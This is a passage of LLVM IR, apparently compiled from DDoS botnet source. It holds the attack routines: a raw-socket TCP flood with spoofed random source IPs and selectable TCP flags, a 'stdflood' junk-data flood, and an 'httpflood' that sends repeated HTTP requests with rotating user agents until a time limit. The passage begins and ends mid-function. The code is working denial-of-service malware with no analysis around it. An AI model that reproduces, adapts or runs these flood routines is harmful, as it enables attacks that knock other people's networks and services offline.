  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %46, i8 0, i64 8, i1 false)
  %47 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #11
  store i32 %47, i32* %15, align 4
  %48 = load i32, i32* %15, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %44
  br label %336

51:                                               ; preds = %44
  store i32 1, i32* %16, align 4
  %52 = load i32, i32* %15, align 4
  %53 = bitcast i32* %16 to i8*
  %54 = call i32 @setsockopt(i32 noundef %52, i32 noundef 0, i32 noundef 3, i8* noundef %53, i32 noundef 4) #11
  %55 = icmp slt i32 %54, 0
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  br label %336

57:                                               ; preds = %51
  %58 = load i32, i32* %11, align 4
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %61

60:                                               ; preds = %57
  store i32 0, i32* %17, align 4
  br label %67

61:                                               ; preds = %57
  %62 = load i32, i32* %11, align 4
  %63 = sub nsw i32 32, %62
  %64 = shl i32 1, %63
  %65 = sub nsw i32 %64, 1
  %66 = xor i32 %65, -1
  store i32 %66, i32* %17, align 4
  br label %67

67:                                               ; preds = %61, %60
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = add i64 40, %69
  %71 = call i8* @llvm.stacksave()
  store i8* %71, i8** %18, align 8
  %72 = alloca i8, i64 %70, align 16
  store i64 %70, i64* %19, align 8
  %73 = bitcast i8* %72 to %struct.iphdr*
  store %struct.iphdr* %73, %struct.iphdr** %20, align 8
  %74 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = getelementptr i8, i8* %75, i64 20
  %77 = bitcast i8* %76 to %struct.tcphdr*
  store %struct.tcphdr* %77, %struct.tcphdr** %21, align 8
  %78 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %80 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 4
  %82 = load i32, i32* %17, align 4
  %83 = call i32 @getRandomIP(i32 noundef %82)
  %84 = call i32 @htonl(i32 noundef %83) #10
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = add i64 20, %86
  %88 = trunc i64 %87 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %78, i32 noundef %81, i32 noundef %84, i8 noundef zeroext 6, i32 noundef %88)
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  %91 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %92 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %91, i32 0, i32 0
  %93 = bitcast %union.anon* %92 to %struct.anon.0*
  %94 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %93, i32 0, i32 0
  store i16 %90, i16* %94, align 4
  %95 = call i32 @rand_cmwc()
  %96 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon* %97 to %struct.anon.0*
  %99 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %98, i32 0, i32 2
  store i32 %95, i32* %99, align 4
  %100 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %101 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %100, i32 0, i32 0
  %102 = bitcast %union.anon* %101 to %struct.anon.0*
  %103 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %102, i32 0, i32 3
  store i32 0, i32* %103, align 4
  %104 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %105 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %104, i32 0, i32 0
  %106 = bitcast %union.anon* %105 to %struct.anon.0*
  %107 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %106, i32 0, i32 4
  %108 = load i16, i16* %107, align 4
  %109 = and i16 %108, -241
  %110 = or i16 %109, 80
  store i16 %110, i16* %107, align 4
  %111 = load i8*, i8** %10, align 8
  %112 = call i32 @strcmp(i8* noundef %111, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #12
  %113 = icmp ne i32 %112, 0
  br i1 %113, label %150, label %114

114:                                              ; preds = %67
  %115 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %115, i32 0, i32 0
  %117 = bitcast %union.anon* %116 to %struct.anon.0*
  %118 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %117, i32 0, i32 4
  %119 = load i16, i16* %118, align 4
  %120 = and i16 %119, -513
  %121 = or i16 %120, 512
  store i16 %121, i16* %118, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -1025
  %128 = or i16 %127, 1024
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -257
  %135 = or i16 %134, 256
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon* %137 to %struct.anon.0*
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -4097
  %142 = or i16 %141, 4096
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon* %144 to %struct.anon.0*
  %146 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -2049
  %149 = or i16 %148, 2048
  store i16 %149, i16* %146, align 4
  br label %226

150:                                              ; preds = %67
  %151 = load i8*, i8** %10, align 8
  %152 = call i8* @strtok(i8* noundef %151, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  store i8* %152, i8** %22, align 8
  br label %153

153:                                              ; preds = %223, %150
  %154 = load i8*, i8** %22, align 8
  %155 = icmp ne i8* %154, null
  br i1 %155, label %156, label %225

156:                                              ; preds = %153
  %157 = load i8*, i8** %22, align 8
  %158 = call i32 @strcmp(i8* noundef %157, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i64 0, i64 0)) #12
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %168, label %160

160:                                              ; preds = %156
  %161 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon* %162 to %struct.anon.0*
  %164 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %163, i32 0, i32 4
  %165 = load i16, i16* %164, align 4
  %166 = and i16 %165, -513
  %167 = or i16 %166, 512
  store i16 %167, i16* %164, align 4
  br label %223

168:                                              ; preds = %156
  %169 = load i8*, i8** %22, align 8
  %170 = call i32 @strcmp(i8* noundef %169, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #12
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %180, label %172

172:                                              ; preds = %168
  %173 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon* %174 to %struct.anon.0*
  %176 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %175, i32 0, i32 4
  %177 = load i16, i16* %176, align 4
  %178 = and i16 %177, -1025
  %179 = or i16 %178, 1024
  store i16 %179, i16* %176, align 4
  br label %222

180:                                              ; preds = %168
  %181 = load i8*, i8** %22, align 8
  %182 = call i32 @strcmp(i8* noundef %181, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i64 0, i64 0)) #12
  %183 = icmp ne i32 %182, 0
  br i1 %183, label %192, label %184

184:                                              ; preds = %180
  %185 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon* %186 to %struct.anon.0*
  %188 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = and i16 %189, -257
  %191 = or i16 %190, 256
  store i16 %191, i16* %188, align 4
  br label %221

192:                                              ; preds = %180
  %193 = load i8*, i8** %22, align 8
  %194 = call i32 @strcmp(i8* noundef %193, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #12
  %195 = icmp ne i32 %194, 0
  br i1 %195, label %204, label %196

196:                                              ; preds = %192
  %197 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon* %198 to %struct.anon.0*
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %201, -4097
  %203 = or i16 %202, 4096
  store i16 %203, i16* %200, align 4
  br label %220

204:                                              ; preds = %192
  %205 = load i8*, i8** %22, align 8
  %206 = call i32 @strcmp(i8* noundef %205, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i64 0, i64 0)) #12
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %216, label %208

208:                                              ; preds = %204
  %209 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon* %210 to %struct.anon.0*
  %212 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -2049
  %215 = or i16 %214, 2048
  store i16 %215, i16* %212, align 4
  br label %219

216:                                              ; preds = %204
  %217 = load i8*, i8** %22, align 8
  %218 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i64 0, i64 0), i8* noundef %217)
  br label %219

219:                                              ; preds = %216, %208
  br label %220

220:                                              ; preds = %219, %196
  br label %221

221:                                              ; preds = %220, %184
  br label %222

222:                                              ; preds = %221, %172
  br label %223

223:                                              ; preds = %222, %160
  %224 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  store i8* %224, i8** %22, align 8
  br label %153, !llvm.loop !15

225:                                              ; preds = %153
  br label %226

226:                                              ; preds = %225, %114
  %227 = call i32 @rand_cmwc()
  %228 = trunc i32 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon* %230 to %struct.anon.0*
  %232 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %231, i32 0, i32 5
  store i16 %228, i16* %232, align 2
  %233 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon* %234 to %struct.anon.0*
  %236 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %235, i32 0, i32 6
  store i16 0, i16* %236, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon* %238 to %struct.anon.0*
  %240 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %239, i32 0, i32 7
  store i16 0, i16* %240, align 2
  %241 = load i32, i32* %7, align 4
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %245

243:                                              ; preds = %226
  %244 = call i32 @rand_cmwc()
  br label %250

245:                                              ; preds = %226
  %246 = load i32, i32* %7, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 noundef zeroext %247) #10
  %249 = zext i16 %248 to i32
  br label %250

250:                                              ; preds = %245, %243
  %251 = phi i32 [ %244, %243 ], [ %249, %245 ]
  %252 = trunc i32 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon* %254 to %struct.anon.0*
  %256 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %255, i32 0, i32 1
  store i16 %252, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %258 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %259 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %257, %struct.tcphdr* noundef %258)
  %260 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 6
  store i16 %259, i16* %263, align 4
  %264 = bitcast i8* %72 to i16*
  %265 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 2
  %267 = load i16, i16* %266, align 2
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @csum(i16* noundef %264, i32 noundef %268)
  %270 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 7
  store i16 %269, i16* %271, align 2
  %272 = call i64 @time(i64* noundef null) #11
  %273 = load i32, i32* %8, align 4
  %274 = sext i32 %273 to i64
  %275 = add nsw i64 %272, %274
  %276 = trunc i64 %275 to i32
  store i32 %276, i32* %23, align 4
  store i32 0, i32* %24, align 4
  br label %277

277:                                              ; preds = %331, %330, %250
  br label %278

278:                                              ; preds = %277
  %279 = load i32, i32* %15, align 4
  %280 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 noundef %279, i8* noundef %72, i64 noundef %70, i32 noundef 0, %struct.sockaddr* noundef %280, i32 noundef 16)
  %282 = load i32, i32* %17, align 4
  %283 = call i32 @getRandomIP(i32 noundef %282)
  %284 = call i32 @htonl(i32 noundef %283) #10
  %285 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  store i32 %284, i32* %286, align 4
  %287 = call i32 @rand_cmwc()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 3
  store i16 %288, i16* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon* %293 to %struct.anon.0*
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 2
  store i32 %291, i32* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 0
  store i16 %297, i16* %301, align 4
  %302 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon* %303 to %struct.anon.0*
  %305 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %304, i32 0, i32 6
  store i16 0, i16* %305, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %307 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %308 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %306, %struct.tcphdr* noundef %307)
  %309 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 6
  store i16 %308, i16* %312, align 4
  %313 = bitcast i8* %72 to i16*
  %314 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 2
  %316 = load i16, i16* %315, align 2
  %317 = zext i16 %316 to i32
  %318 = call zeroext i16 @csum(i16* noundef %313, i32 noundef %317)
  %319 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 7
  store i16 %318, i16* %320, align 2
  %321 = load i32, i32* %24, align 4
  %322 = load i32, i32* %13, align 4
  %323 = icmp eq i32 %321, %322
  br i1 %323, label %324, label %331

324:                                              ; preds = %278
  %325 = call i64 @time(i64* noundef null) #11
  %326 = load i32, i32* %23, align 4
  %327 = sext i32 %326 to i64
  %328 = icmp sgt i64 %325, %327
  br i1 %328, label %329, label %330

329:                                              ; preds = %324
  br label %334

330:                                              ; preds = %324
  store i32 0, i32* %24, align 4
  br label %277

331:                                              ; preds = %278
  %332 = load i32, i32* %24, align 4
  %333 = add i32 %332, 1
  store i32 %333, i32* %24, align 4
  br label %277

334:                                              ; preds = %329
  %335 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %335)
  br label %336

336:                                              ; preds = %334, %56, %50, %43
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #4

; Function Attrs: nounwind
declare i8* @strtok(i8* noundef, i8* noundef) #2

declare i32 @printf(i8* noundef, ...) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @stdflood(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #11
  store i32 %15, i32* %9, align 4
  %16 = call i64 @time(i64* noundef null) #11
  store i64 %16, i64* %10, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* noundef %17)
  store %struct.hostent* %18, %struct.hostent** %12, align 8
  %19 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %19, i8 0, i64 16, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %12, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* noundef %24, i8* noundef %26, i64 noundef %30) #11
  %31 = load %struct.hostent*, %struct.hostent** %12, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %13, align 4
  br label %39

39:                                               ; preds = %62, %4
  %40 = load i32, i32* %13, align 4
  %41 = icmp uge i32 %40, 50
  br i1 %41, label %42, label %62

42:                                               ; preds = %39
  %43 = call i8* @makestring()
  store i8* %43, i8** %14, align 8
  %44 = load i32, i32* %9, align 4
  %45 = load i8*, i8** %14, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @send(i32 noundef %44, i8* noundef %45, i64 noundef %47, i32 noundef 0)
  %49 = load i32, i32* %9, align 4
  %50 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %51 = call i32 @connect(i32 noundef %49, %struct.sockaddr* noundef %50, i32 noundef 16)
  %52 = call i64 @time(i64* noundef null) #11
  %53 = load i64, i64* %10, align 8
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = add nsw i64 %53, %55
  %57 = icmp sge i64 %52, %56
  br i1 %57, label %58, label %61

58:                                               ; preds = %42
  %59 = load i32, i32* %9, align 4
  %60 = call i32 @close(i32 noundef %59)
  call void @_exit(i32 noundef 0) #13
  unreachable

61:                                               ; preds = %42
  store i32 0, i32* %13, align 4
  br label %62

62:                                               ; preds = %61, %39
  %63 = load i32, i32* %13, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %13, align 4
  br label %39
}

declare %struct.hostent* @gethostbyname(i8* noundef) #6

; Function Attrs: nounwind
declare void @bcopy(i8* noundef, i8* noundef, i64 noundef) #2

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #6

declare i32 @connect(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #6

declare i32 @close(i32 noundef) #6

; Function Attrs: noreturn
declare void @_exit(i32 noundef) #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @socket_connect(i8* noundef %0, i16 noundef zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* noundef %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  call void @herror(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #11
  call void @exit(i32 noundef 1) #14
  unreachable

13:                                               ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* noundef %18, i8* noundef %20, i64 noundef %24) #11
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 noundef zeroext %25) #10
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 6) #11
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 noundef %30, i32 noundef 6, i32 noundef 1, i8* noundef %31, i32 noundef 4) #11
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

35:                                               ; preds = %13
  call void @perror(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0))
  call void @exit(i32 noundef 1) #14
  unreachable

36:                                               ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 noundef %37, %struct.sockaddr* noundef %38, i32 noundef 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %36
  call void @perror(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i64 0, i64 0))
  call void @exit(i32 noundef 1) #14
  unreachable

42:                                               ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

; Function Attrs: nounwind
declare void @herror(i8* noundef) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #9

declare void @perror(i8* noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @httpflood(i8* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i8* noundef %3, i32 noundef %4, i32 noundef %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* noundef null) #11
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

24:                                               ; preds = %63, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %66

28:                                               ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #11
  %34 = srem i32 %33, 39
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %29, i8* noundef getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i64 0, i64 0), i8* noundef %30, i8* noundef %31, i8* noundef %32, i8* noundef %37) #11
  br label %39

39:                                               ; preds = %61, %28
  %40 = load i32, i32* %15, align 4
  %41 = sext i32 %40 to i64
  %42 = call i64 @time(i64* noundef null) #11
  %43 = icmp sgt i64 %41, %42
  br i1 %43, label %44, label %62

44:                                               ; preds = %39
  %45 = load i8*, i8** %8, align 8
  %46 = load i16, i16* %9, align 2
  %47 = call i32 @socket_connect(i8* noundef %45, i16 noundef zeroext %46)
  store i32 %47, i32* %13, align 4
  %48 = load i32, i32* %13, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %61

50:                                               ; preds = %44
  %51 = load i32, i32* %13, align 4
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %54 = call i64 @strlen(i8* noundef %53) #12
  %55 = call i64 @write(i32 noundef %51, i8* noundef %52, i64 noundef %54)
